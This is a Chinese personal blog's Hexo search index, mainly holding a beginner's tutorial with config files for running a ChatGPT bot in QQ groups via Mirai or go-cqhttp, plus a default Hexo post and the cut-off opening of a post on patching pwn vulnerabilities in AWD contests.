<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1-plus</title>
    <url>/2023/04/27/1-plus/</url>
    <content><![CDATA[<p>第二次的第一次</p>
<p><img src="/2023/04/27/1-plus/q.jpg" alt="steam"></p>
]]></content>
  </entry>
  <entry>
    <title>如何在qq群里部署chat</title>
    <url>/2023/05/03/chat/</url>
    <content><![CDATA[<p>本篇主要讲的是mirai和go-cqhttp在windos下的部署</p>
<h1 id="第一个Mirai（风险较大，可用时间不长）："><a href="#第一个Mirai（风险较大，可用时间不长）：" class="headerlink" title="第一个Mirai（风险较大，可用时间不长）："></a>第一个Mirai（风险较大，可用时间不长）：</h1><p>首先我们先在</p>
<p><a href="https://github.com/lss233/chatgpt-mirai-qq-bot/releases">Releases · lss233&#x2F;chatgpt-mirai-qq-bot (github.com)</a></p>
<p>下载最新的压缩包解压(在Assets第一个下载即可)</p>
<p><img src="/2023/05/03/chat/1.png" alt="1"></p>
<p>下载打开之后是这样的<img src="/2023/05/03/chat/2.png" alt="2"></p>
<p>首先我们点击启动初始化.cmd初始化之后Enter即可，随后，一个记事本会被弹出，这是初始化程序想让你填写配置文件，不用管他照样退出，不要被别人支配（在这里填写也行，但是我没成功），随后在chatgpt&#x2F;config.cfg进行配置，这里出现的问题很多，有的问题我也没解决，所以直接用我这个（记住qq一定要用小号！！！）</p>
<h2 id="config-cfg（chatgpt）"><a href="#config-cfg（chatgpt）" class="headerlink" title="config.cfg（chatgpt）"></a>config.cfg（chatgpt）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mirai]</span><br><span class="line">qq = 1111111111  #你的qq小号</span><br><span class="line"></span><br><span class="line">manager_qq = 2222222222  #你的qq大号</span><br><span class="line"></span><br><span class="line">api_key = &quot;1234567890&quot;</span><br><span class="line">reverse_ws_host = &quot;0.0.0.0&quot;</span><br><span class="line">reverse_ws_port = 8554</span><br><span class="line"></span><br><span class="line">#下面是 mirai api http 正向连接模式</span><br><span class="line"></span><br><span class="line">#使用此模式时需注释上面的反向连接模式</span><br><span class="line"></span><br><span class="line">#http_url = &quot;http://localhost:8080&quot;</span><br><span class="line"></span><br><span class="line">#ws_url = &quot;http://localhost:8080&quot;</span><br><span class="line"></span><br><span class="line">#[openai]</span><br><span class="line">#browserless_endpoint = &quot;https://bypass.duti.tech/&quot;</span><br><span class="line">[openai]</span><br><span class="line"></span><br><span class="line">#OpenAI 相关设置</span><br><span class="line"></span><br><span class="line">#自定义 ChatGPT 的 browserless 接入点</span><br><span class="line"></span><br><span class="line">#自 3月9日 开始，不设置此项将无法正常使用 browserless 模式下的网页版 ChatGPT</span><br><span class="line"></span><br><span class="line">browserless_endpoint = &quot;https://bypass.duti.tech/api/&quot;</span><br><span class="line"></span><br><span class="line">#自定义 OpenAI 的 API 接口基础地址</span><br><span class="line"></span><br><span class="line">#通过此功能，你可以搭建一个 OpenAI 的反向代理来避免网络问题</span><br><span class="line"></span><br><span class="line">#例如此项目：https://github.com/Ice-Hazymoon/openai-scf-proxy</span><br><span class="line"></span><br><span class="line">#api_endpoint = &quot;https://api.openai.com/v1&quot;</span><br><span class="line"></span><br><span class="line">#以下是 GPT3(.5) 和 GPT4 的模型参数</span><br><span class="line"></span><br><span class="line">#在使用 API 调用时有效</span><br><span class="line"></span><br><span class="line">#参数具体含义可以见 https://platform.openai.com/docs/api-reference/completions/create</span><br><span class="line"></span><br><span class="line">#如果你不了解，可以保持默认</span><br><span class="line"></span><br><span class="line">[openai.gpt3_params]</span><br><span class="line">temperature = 0.5</span><br><span class="line">max_tokens = 4000</span><br><span class="line">top_p = 1.0</span><br><span class="line">presence_penalty = 0.0</span><br><span class="line">frequency_penalty = 0.0</span><br><span class="line">min_tokens = 1000</span><br><span class="line"></span><br><span class="line">#第一个账号</span><br><span class="line"></span><br><span class="line">[[openai.accounts]]</span><br><span class="line">mode = &quot;browserless&quot;</span><br><span class="line"></span><br><span class="line">#你的 OpenAI 邮箱</span><br><span class="line"></span><br><span class="line">email = &quot; ****************&quot;    #账号（引号不能省略）</span><br><span class="line"></span><br><span class="line">#你的 OpenAI 密码</span><br><span class="line"></span><br><span class="line">password = &quot;****************&quot;     #账号密码</span><br><span class="line"></span><br><span class="line">#clash代理的端口号</span><br><span class="line"></span><br><span class="line">proxy=&quot;http://127.0.0.1:7890&quot;</span><br><span class="line"></span><br><span class="line">#使用 ChatGPT Plus（plus 用户此项设置为 true 使用 legacy 模型）</span><br><span class="line"></span><br><span class="line">paid = true</span><br><span class="line"></span><br><span class="line">#是否开启标题自动重命名</span><br><span class="line"></span><br><span class="line">title_pattern=&quot;qq-&#123;session_id&#125;&quot;</span><br><span class="line"></span><br><span class="line">#是否自动删除旧的对话，开启后用户发送重置对话时会自动删除以前的会话内容</span><br><span class="line"></span><br><span class="line">auto_remove_old_conversations = true</span><br><span class="line"></span><br><span class="line">#第二个账号</span><br><span class="line"></span><br><span class="line">[[openai.accounts]]</span><br><span class="line"></span><br><span class="line">api_key=&quot;  &quot;</span><br><span class="line"></span><br><span class="line">proxy=&quot;http://127.0.0.1:7890&quot;</span><br><span class="line"></span><br><span class="line">[[openai.accounts]]</span><br><span class="line"></span><br><span class="line">api_key=&quot; &quot;</span><br><span class="line"></span><br><span class="line">proxy=&quot;http://127.0.0.1:7890&quot;</span><br><span class="line"></span><br><span class="line">#是否开启标题自动重命名</span><br><span class="line"></span><br><span class="line">title_pattern=&quot;qq-&#123;session_id&#125;&quot;</span><br><span class="line"></span><br><span class="line">#是否自动删除旧的对话，开启后用户发送重置对话时会自动删除以前的会话内容</span><br><span class="line"></span><br><span class="line">auto_remove_old_conversations = true</span><br><span class="line"></span><br><span class="line">#=== Poe 账号部分开始</span><br><span class="line"></span><br><span class="line">#如果你没有 Poe 账号，可以直接删除这部分</span><br><span class="line"></span><br><span class="line">#[poe]</span><br><span class="line">#[[poe.accounts]]</span><br><span class="line"></span><br><span class="line">#登陆 poe.com 网站后，通过开发者工具查看Cookie获取</span><br><span class="line"></span><br><span class="line">#p_b = &quot; &quot;</span><br><span class="line"></span><br><span class="line">#=== Poe 账号部分结束</span><br><span class="line"></span><br><span class="line">[baiducloud]</span><br><span class="line">#是否启动百度云内容安全审核</span><br><span class="line">check = false</span><br><span class="line"></span><br><span class="line">#百度云API_KEY 24位英文数字字符串</span><br><span class="line">baidu_api_key = &quot;&quot;</span><br><span class="line"></span><br><span class="line">#百度云SECRET_KEY 32位的英文数字字符串</span><br><span class="line">baidu_secret_key =&quot;&quot;</span><br><span class="line"></span><br><span class="line">#不合规消息自定义返回</span><br><span class="line">illgalmessage = &quot;[百度云]请珍惜机器人，当前返回内容不合规&quot;</span><br><span class="line"></span><br><span class="line">[system]</span><br><span class="line"></span><br><span class="line">#是否自动同意进群邀请</span><br><span class="line"></span><br><span class="line">accept_group_invite = false</span><br><span class="line"></span><br><span class="line">#是否自动同意好友请求</span><br><span class="line"></span><br><span class="line">accept_friend_request = false</span><br><span class="line"></span><br><span class="line">[presets]</span><br><span class="line"></span><br><span class="line">#切换预设的命令： 加载预设 猫娘</span><br><span class="line"></span><br><span class="line">command = &quot;加载预设 (\\w+)&quot;</span><br><span class="line">loaded_successful = &quot;预设加载成功！&quot;</span><br><span class="line">scan_dir = &quot;./presets/&quot;</span><br><span class="line"></span><br><span class="line">[presets.keywords]</span><br><span class="line"></span><br><span class="line">#预设关键词 &lt;-&gt; 实际文件</span><br><span class="line"></span><br><span class="line">&quot;正常&quot; = &quot;presets/default.txt&quot;</span><br><span class="line">&quot;猫娘&quot; = &quot;presets/catgirl.txt&quot;</span><br><span class="line"></span><br><span class="line">#&quot;default&quot; = &quot;presets/default.txt&quot; # 默认预设，开启后所有的会话都会先读这个预设，谨慎使用！</span><br></pre></td></tr></table></figure>



<h2 id="接下来讲一下注意事项（一定要看）"><a href="#接下来讲一下注意事项（一定要看）" class="headerlink" title="接下来讲一下注意事项（一定要看）"></a>接下来讲一下注意事项（一定要看）</h2><p>1.事先说明Mirai真不建议使用，倒不是应为会更容易封qq号，而是因为我第一天弄得Mirai正常使用，第二天就登不上去了，不保险；</p>
<p>2.其实呢openai的第一个账号密码登录不建议使用，因为根本登不上，好像是因为不支持了，直接使用key，什么？key在哪里？（首先呢你得有openai账号，没有的话那你来错地方了）进入官方主界面点击Developers—API reference，随后点击</p>
<p><img src="/2023/05/03/chat/3.png" alt="3"></p>
<p>后面你肯定会了，key是“sk-”开头的，复制粘贴即可</p>
<p>3.poe账号，这是我最想吐槽的，账号很好注册，但是很容易封号，我玩这个已经封了两个了，但是这个也有优点，这里              也是重点：openai在这里用的是chatgpt-3的并不是3.5，而poe正是3.5（不过只能体验二十分钟，因为差不多就被封了）  后面的AI平台的账号我也还没注册，有空了再帮大家试试水。</p>
<p>随后就是配置Mirai（这个也有点艰难，坚持坚持）</p>
<p>首先，双击 Mirai.cmd，然后等待程序启动完毕。</p>
<p>如果你看见了红色的错误提示，无需理会。</p>
<p><img src="/2023/05/03/chat/4.png" alt="4"></p>
<p>随后在下面输入</p>
<p>login 11111111  2222222 MACOS     &#x2F;&#x2F;第一段11111111你的qq小号第二段22222222是你的密码</p>
<p>成功之后会出现<img src="/2023/05/03/chat/5.png" alt="5"></p>
<p>把我涂鸦地方的复制到浏览器上访问，先点击F12点击网络并输入verify，在通过完全滑块认证，点击最后一条信息复制粘贴即可<img src="/2023/05/03/chat/6.png" alt="6"></p>
<p><img src="/2023/05/03/chat/7.png" alt="7"></p>
<p>(点击橙色部分复制到那里即可)</p>
<p>接下来，Mirai 很有可能会让你进行短信验证。通常到了这一步的时候，你离整个项目顺利运行已经不远了。</p>
<p>看到下面这段提示后，我们输入 yes 回车。输入验证码（我就不演示了，号登不上咯）当然也可以根据提示按其他，通过手机扫码也可以啦</p>
<p>随后 Mirai 已经成功登录并接管了你机器人的 QQ。</p>
<p>接下来我们要设置自动登录</p>
<p>在窗口中输入以下几条命令：</p>
<p>autologin add 你机器人的QQ号 你机器人的QQ密码</p>
<p>autologin setConfig 你机器人的QQ号 PROTOCOL MACOS</p>
<p>这样，下次启动 Mirai 时，它就会自动登录你机器人的 QQ。</p>
<h1 id="对接-OneBot-go-cqhttp"><a href="#对接-OneBot-go-cqhttp" class="headerlink" title="对接 OneBot (go-cqhttp)"></a>对接 OneBot (go-cqhttp)</h1><p>当你会Mirai时这个就简单了（同样的套路注释前面的mirai的全部再加入onebot即可，这里我又重新写一遍config.cfg便于理解）</p>
<p>首先我们点击启动初始化.cmd初始化之后Enter即可，随后，一个记事本会被弹出，这是初始化程序想让你填写配置文件，不用管他照样退出，不要被别人支配（在这里填写也行，但是我没成功），随后在chatgpt&#x2F;config.cfg进行配置，这里出现的问题很多，有的问题我也没解决，所以直接用我这个（记住qq一定要用小号！！！）</p>
<h2 id="config-cfg（chatgpt）-1"><a href="#config-cfg（chatgpt）-1" class="headerlink" title="config.cfg（chatgpt）"></a>config.cfg（chatgpt）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#[mirai]</span><br><span class="line">#qq = 1111111111  #你的qq小号</span><br><span class="line"></span><br><span class="line">#manager_qq = 2222222222  #你的qq大号</span><br><span class="line"></span><br><span class="line">#api_key = &quot;1234567890&quot;</span><br><span class="line">#reverse_ws_host = &quot;0.0.0.0&quot;</span><br><span class="line">#reverse_ws_port = 8554</span><br><span class="line"></span><br><span class="line">[onebot]</span><br><span class="line">qq=111111111  #你的qq小号</span><br><span class="line">manager_qq =11111111111 #你的大号</span><br><span class="line"></span><br><span class="line">reverse_ws_host = &quot;0.0.0.0&quot;</span><br><span class="line">reverse_ws_port = 8566</span><br><span class="line"></span><br><span class="line">#下面是 mirai api http 正向连接模式</span><br><span class="line"></span><br><span class="line">#使用此模式时需注释上面的反向连接模式</span><br><span class="line"></span><br><span class="line">#http_url = &quot;http://localhost:8080&quot;</span><br><span class="line"></span><br><span class="line">#ws_url = &quot;http://localhost:8080&quot;</span><br><span class="line"></span><br><span class="line">#[openai]</span><br><span class="line">#browserless_endpoint = &quot;https://bypass.duti.tech/&quot;</span><br><span class="line">[openai]</span><br><span class="line"></span><br><span class="line">#OpenAI 相关设置</span><br><span class="line"></span><br><span class="line">#自定义 ChatGPT 的 browserless 接入点</span><br><span class="line"></span><br><span class="line">#自 3月9日 开始，不设置此项将无法正常使用 browserless 模式下的网页版 ChatGPT</span><br><span class="line"></span><br><span class="line">browserless_endpoint = &quot;https://bypass.duti.tech/api/&quot;</span><br><span class="line"></span><br><span class="line">#自定义 OpenAI 的 API 接口基础地址</span><br><span class="line"></span><br><span class="line">#通过此功能，你可以搭建一个 OpenAI 的反向代理来避免网络问题</span><br><span class="line"></span><br><span class="line">#例如此项目：https://github.com/Ice-Hazymoon/openai-scf-proxy</span><br><span class="line"></span><br><span class="line">#api_endpoint = &quot;https://api.openai.com/v1&quot;</span><br><span class="line"></span><br><span class="line">#以下是 GPT3(.5) 和 GPT4 的模型参数</span><br><span class="line"></span><br><span class="line">#在使用 API 调用时有效</span><br><span class="line"></span><br><span class="line">#参数具体含义可以见 https://platform.openai.com/docs/api-reference/completions/create</span><br><span class="line"></span><br><span class="line">#如果你不了解，可以保持默认</span><br><span class="line"></span><br><span class="line">[openai.gpt3_params]</span><br><span class="line">temperature = 0.5</span><br><span class="line">max_tokens = 4000</span><br><span class="line">top_p = 1.0</span><br><span class="line">presence_penalty = 0.0</span><br><span class="line">frequency_penalty = 0.0</span><br><span class="line">min_tokens = 1000</span><br><span class="line"></span><br><span class="line">#第一个账号</span><br><span class="line"></span><br><span class="line">[[openai.accounts]]</span><br><span class="line">mode = &quot;browserless&quot;</span><br><span class="line"></span><br><span class="line">#你的 OpenAI 邮箱</span><br><span class="line"></span><br><span class="line">email = &quot; ****************&quot;    #账号（引号不能省略）</span><br><span class="line"></span><br><span class="line">#你的 OpenAI 密码</span><br><span class="line"></span><br><span class="line">password = &quot;****************&quot;     #账号密码</span><br><span class="line"></span><br><span class="line">#clash代理的端口号</span><br><span class="line"></span><br><span class="line">proxy=&quot;http://127.0.0.1:7890&quot;</span><br><span class="line"></span><br><span class="line">#使用 ChatGPT Plus（plus 用户此项设置为 true 使用 legacy 模型）</span><br><span class="line"></span><br><span class="line">paid = true</span><br><span class="line"></span><br><span class="line">#是否开启标题自动重命名</span><br><span class="line"></span><br><span class="line">title_pattern=&quot;qq-&#123;session_id&#125;&quot;</span><br><span class="line"></span><br><span class="line">#是否自动删除旧的对话，开启后用户发送重置对话时会自动删除以前的会话内容</span><br><span class="line"></span><br><span class="line">auto_remove_old_conversations = true</span><br><span class="line"></span><br><span class="line">#第二个账号</span><br><span class="line"></span><br><span class="line">[[openai.accounts]]</span><br><span class="line"></span><br><span class="line">api_key=&quot;  &quot;</span><br><span class="line"></span><br><span class="line">proxy=&quot;http://127.0.0.1:7890&quot;</span><br><span class="line"></span><br><span class="line">[[openai.accounts]]</span><br><span class="line"></span><br><span class="line">api_key=&quot; &quot;</span><br><span class="line"></span><br><span class="line">proxy=&quot;http://127.0.0.1:7890&quot;</span><br><span class="line"></span><br><span class="line">#是否开启标题自动重命名</span><br><span class="line"></span><br><span class="line">title_pattern=&quot;qq-&#123;session_id&#125;&quot;</span><br><span class="line"></span><br><span class="line">#是否自动删除旧的对话，开启后用户发送重置对话时会自动删除以前的会话内容</span><br><span class="line"></span><br><span class="line">auto_remove_old_conversations = true</span><br><span class="line"></span><br><span class="line">#=== Poe 账号部分开始</span><br><span class="line"></span><br><span class="line">#如果你没有 Poe 账号，可以直接删除这部分</span><br><span class="line"></span><br><span class="line">#[poe]</span><br><span class="line">#[[poe.accounts]]</span><br><span class="line"></span><br><span class="line">#登陆 poe.com 网站后，通过开发者工具查看Cookie获取</span><br><span class="line"></span><br><span class="line">#p_b = &quot; &quot;</span><br><span class="line"></span><br><span class="line">#=== Poe 账号部分结束</span><br><span class="line"></span><br><span class="line">[baiducloud]</span><br><span class="line">#是否启动百度云内容安全审核</span><br><span class="line">check = false</span><br><span class="line"></span><br><span class="line">#百度云API_KEY 24位英文数字字符串</span><br><span class="line">baidu_api_key = &quot;&quot;</span><br><span class="line"></span><br><span class="line">#百度云SECRET_KEY 32位的英文数字字符串</span><br><span class="line">baidu_secret_key =&quot;&quot;</span><br><span class="line"></span><br><span class="line">#不合规消息自定义返回</span><br><span class="line">illgalmessage = &quot;[百度云]请珍惜机器人，当前返回内容不合规&quot;</span><br><span class="line"></span><br><span class="line">[system]</span><br><span class="line"></span><br><span class="line">#是否自动同意进群邀请</span><br><span class="line"></span><br><span class="line">accept_group_invite = false</span><br><span class="line"></span><br><span class="line">#是否自动同意好友请求</span><br><span class="line"></span><br><span class="line">accept_friend_request = false</span><br><span class="line"></span><br><span class="line">[presets]</span><br><span class="line"></span><br><span class="line">#切换预设的命令： 加载预设 猫娘</span><br><span class="line"></span><br><span class="line">command = &quot;加载预设 (\\w+)&quot;</span><br><span class="line">loaded_successful = &quot;预设加载成功！&quot;</span><br><span class="line">scan_dir = &quot;./presets/&quot;</span><br><span class="line"></span><br><span class="line">[presets.keywords]</span><br><span class="line"></span><br><span class="line">#预设关键词 &lt;-&gt; 实际文件</span><br><span class="line"></span><br><span class="line">&quot;正常&quot; = &quot;presets/default.txt&quot;</span><br><span class="line">&quot;猫娘&quot; = &quot;presets/catgirl.txt&quot;</span><br><span class="line"></span><br><span class="line">#&quot;default&quot; = &quot;presets/default.txt&quot; # 默认预设，开启后所有的会话都会先读这个预设，谨慎使用！</span><br></pre></td></tr></table></figure>



<h2 id="下载go-cqhttp"><a href="#下载go-cqhttp" class="headerlink" title="下载go-cqhttp"></a>下载go-cqhttp</h2><p>你可以在这里下载最新的 go-cqhttp：<a href="https://github.com/Mrs4s/go-cqhttp/releases">https://github.com/Mrs4s/go-cqhttp/releases</a></p>
<p>下载之后解压启动，点击go-cqhttp.exe进行操作后会生成go-cqhttp.bat</p>
<p>打开后选3回车退出</p>
<h2 id="设置config-yml（go-cqhttp）"><a href="#设置config-yml（go-cqhttp）" class="headerlink" title="设置config.yml（go-cqhttp）"></a>设置config.yml（go-cqhttp）</h2><p>直接复制我的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\# go-cqhttp 默认配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">account: # 账号相关</span><br><span class="line"></span><br><span class="line">  uin: 111111111111 # QQ账号</span><br><span class="line"></span><br><span class="line">  password: &#x27;&#x27; # 密码为空时使用扫码登录</span><br><span class="line"></span><br><span class="line">  encrypt: false  # 是否开启密码加密</span><br><span class="line"></span><br><span class="line">  status: 0      # 在线状态 请参考 https://docs.go-cqhttp.org/guide/config.html#在线状态</span><br><span class="line"></span><br><span class="line">  relogin: # 重连设置</span><br><span class="line"></span><br><span class="line">​    delay: 3   # 首次重连延迟, 单位秒</span><br><span class="line"></span><br><span class="line">​    interval: 3   # 重连间隔</span><br><span class="line"></span><br><span class="line">​    max-times: 0  # 最大重连次数, 0为无限制</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  \# 是否使用服务器下发的新地址进行重连</span><br><span class="line"></span><br><span class="line">  \# 注意, 此设置可能导致在海外服务器上连接情况更差</span><br><span class="line"></span><br><span class="line">  use-sso-address: true</span><br><span class="line"></span><br><span class="line">  \# 是否允许发送临时会话消息</span><br><span class="line"></span><br><span class="line">  allow-temp-session: false</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heartbeat:</span><br><span class="line"></span><br><span class="line">  \# 心跳频率, 单位秒</span><br><span class="line"></span><br><span class="line">  \# -1 为关闭心跳</span><br><span class="line"></span><br><span class="line">  interval: 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message:</span><br><span class="line"></span><br><span class="line">  \# 上报数据类型</span><br><span class="line"></span><br><span class="line">  \# 可选: string,array</span><br><span class="line"></span><br><span class="line">  post-format: string</span><br><span class="line"></span><br><span class="line">  \# 是否忽略无效的CQ码, 如果为假将原样发送</span><br><span class="line"></span><br><span class="line">  ignore-invalid-cqcode: false</span><br><span class="line"></span><br><span class="line">  \# 是否强制分片发送消息</span><br><span class="line"></span><br><span class="line">  \# 分片发送将会带来更快的速度</span><br><span class="line"></span><br><span class="line">  \# 但是兼容性会有些问题</span><br><span class="line"></span><br><span class="line">  force-fragment: false</span><br><span class="line"></span><br><span class="line">  \# 是否将url分片发送</span><br><span class="line"></span><br><span class="line">  fix-url: false</span><br><span class="line"></span><br><span class="line">  \# 下载图片等请求网络代理</span><br><span class="line"></span><br><span class="line">  proxy-rewrite: &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">  \# 是否上报自身消息</span><br><span class="line"></span><br><span class="line">  report-self-message: false</span><br><span class="line"></span><br><span class="line">  \# 移除服务端的Reply附带的At</span><br><span class="line"></span><br><span class="line">  remove-reply-at: false</span><br><span class="line"></span><br><span class="line">  \# 为Reply附加更多信息</span><br><span class="line"></span><br><span class="line">  extra-reply-data: false</span><br><span class="line"></span><br><span class="line">  \# 跳过 Mime 扫描, 忽略错误数据</span><br><span class="line"></span><br><span class="line">  skip-mime-scan: false</span><br><span class="line"></span><br><span class="line">  \# 是否自动转换 WebP 图片</span><br><span class="line"></span><br><span class="line">  convert-webp-image: false</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"></span><br><span class="line">  \# 日志等级 trace,debug,info,warn,error</span><br><span class="line"></span><br><span class="line">  log-level: warn</span><br><span class="line"></span><br><span class="line">  \# 日志时效 单位天. 超过这个时间之前的日志将会被自动删除. 设置为 0 表示永久保留.</span><br><span class="line"></span><br><span class="line">  log-aging: 15</span><br><span class="line"></span><br><span class="line">  \# 是否在每次启动时强制创建全新的文件储存日志. 为 false 的情况下将会在上次启动时创建的日志文件续写</span><br><span class="line"></span><br><span class="line">  log-force-new: true</span><br><span class="line"></span><br><span class="line">  \# 是否启用日志颜色</span><br><span class="line"></span><br><span class="line">  log-colorful: true</span><br><span class="line"></span><br><span class="line">  \# 是否启用 DEBUG</span><br><span class="line"></span><br><span class="line">  debug: false # 开启调试模式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\# 默认中间件锚点</span><br><span class="line"></span><br><span class="line">default-middlewares: &amp;default</span><br><span class="line"></span><br><span class="line">  \# 访问密钥, 强烈推荐在公网的服务器设置</span><br><span class="line"></span><br><span class="line">  access-token: &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">  \# 事件过滤器文件目录</span><br><span class="line"></span><br><span class="line">  filter: &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">  \# API限速设置</span><br><span class="line"></span><br><span class="line">  \# 该设置为全局生效</span><br><span class="line"></span><br><span class="line">  \# 原 cqhttp 虽然启用了 rate_limit 后缀, 但是基本没插件适配</span><br><span class="line"></span><br><span class="line">  \# 目前该限速设置为令牌桶算法, 请参考:</span><br><span class="line"></span><br><span class="line">  \# https://baike.baidu.com/item/%E4%BB%A4%E7%89%8C%E6%A1%B6%E7%AE%97%E6%B3%95/6597000?fr=aladdin</span><br><span class="line"></span><br><span class="line">  rate-limit:</span><br><span class="line"></span><br><span class="line">​    enabled: false # 是否启用限速</span><br><span class="line"></span><br><span class="line">​    frequency: 1  # 令牌回复频率, 单位秒</span><br><span class="line"></span><br><span class="line">​    bucket: 1     # 令牌桶大小</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database: # 数据库相关设置</span><br><span class="line"></span><br><span class="line">  leveldb:</span><br><span class="line"></span><br><span class="line">​    \# 是否启用内置leveldb数据库</span><br><span class="line"></span><br><span class="line">​    \# 启用将会增加10-20MB的内存占用和一定的磁盘空间</span><br><span class="line"></span><br><span class="line">​    \# 关闭将无法使用 撤回 回复 get_msg 等上下文相关功能</span><br><span class="line"></span><br><span class="line">​    enable: true</span><br><span class="line"></span><br><span class="line">  sqlite3:</span><br><span class="line"></span><br><span class="line">​    \# 是否启用内置sqlite3数据库</span><br><span class="line"></span><br><span class="line">​    \# 启用将会增加一定的内存占用和一定的磁盘空间</span><br><span class="line"></span><br><span class="line">​    \# 关闭将无法使用 撤回 回复 get_msg 等上下文相关功能</span><br><span class="line"></span><br><span class="line">​    enable: false</span><br><span class="line"></span><br><span class="line">​    cachettl: 3600000000000 # 1h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\# 连接服务列表</span><br><span class="line"></span><br><span class="line">servers:</span><br><span class="line"></span><br><span class="line">  \# 添加方式，同一连接方式可添加多个，具体配置说明请查看文档</span><br><span class="line"></span><br><span class="line">  \#- http: # http 通信</span><br><span class="line"></span><br><span class="line">  \#- ws:   # 正向 Websocket</span><br><span class="line"></span><br><span class="line">  \#- ws-reverse: # 反向 Websocket</span><br><span class="line"></span><br><span class="line">  \#- pprof: #性能分析服务器</span><br><span class="line"></span><br><span class="line">  \# 反向WS设置</span><br><span class="line"></span><br><span class="line">  \- ws-reverse:</span><br><span class="line"></span><br><span class="line">​      \# 反向WS Universal 地址</span><br><span class="line"></span><br><span class="line">​      \# 注意 设置了此项地址后下面两项将会被忽略</span><br><span class="line"></span><br><span class="line">​      universal: ws://127.0.0.1:8566/ws</span><br><span class="line"></span><br><span class="line">​      \# 反向WS API 地址</span><br><span class="line"></span><br><span class="line">​      api: ws://your_websocket_api.server</span><br><span class="line"></span><br><span class="line">​      \# 反向WS Event 地址</span><br><span class="line"></span><br><span class="line">​      event: ws://your_websocket_event.server</span><br><span class="line"></span><br><span class="line">​      \# 重连间隔 单位毫秒</span><br><span class="line"></span><br><span class="line">​      reconnect-interval: 3000</span><br><span class="line"></span><br><span class="line">​      middlewares:</span><br><span class="line"></span><br><span class="line">​        &lt;&lt;: *default # 引用默认中间件</span><br></pre></td></tr></table></figure>



<h2 id="启动go-cqhttp-bat"><a href="#启动go-cqhttp-bat" class="headerlink" title="启动go-cqhttp.bat"></a>启动go-cqhttp.bat</h2><p>首次启动go-cqhttp.bat时我们不要登录 QQ，我们只是需要它生成的 <code>device.json</code>文件。</p>
<p>然后将protocol的数值修改为2（找不到protocol的Ctrl+F搜索）</p>
<p><img src="/2023/05/03/chat/8.png" alt="8"></p>
<p>退出来再次扫码登录即可<img src="/2023/05/03/chat/9.png" alt="9"></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1.扫码时建议让电脑连接手机的热点，还有就是这个时候电脑不要挂梯子；</p>
<p>2.这个真的比Mirai好……</p>
<p>3.设置反向WS Universal 地址之类的用我这个就行啦，也可以从网上查。</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>最后呢就是使用啦（超级爽）</p>
<p>1.使用go-cqhttp:打开go-cqhttp.bat和启动ChatGPT.cmd即可</p>
<p>2.使用Mirai：打开启动Mirai.cmd和和启动ChatGPT.cmd即可</p>
<p>记住要挂梯子哟！！！</p>
<hr>
<p>注：本人是纯小白，肯定有错误的，看了还是不行的去网上查，我也是从网上查一步步做出来的，加油！！！！</p>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/04/27/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>AWD</title>
    <url>/2023/06/21/awd/</url>
    <content><![CDATA[<p>本篇主要讲的是相对于pwn来说比较基础的awd攻防对抗的几种类型，比如对溢出漏洞，格式化字符串漏洞，整数溢出漏洞，数组索引越界漏洞，以及跟堆有关的UAF漏洞的修复。</p>
<p>在了解这些之前呢首先你的掌握对IDA的最基本的使用以及汇编代码的基本了解</p>
<h1 id="格式化字符串漏洞："><a href="#格式化字符串漏洞：" class="headerlink" title="格式化字符串漏洞："></a>格式化字符串漏洞：</h1><p>直接来个最简单的例子</p>
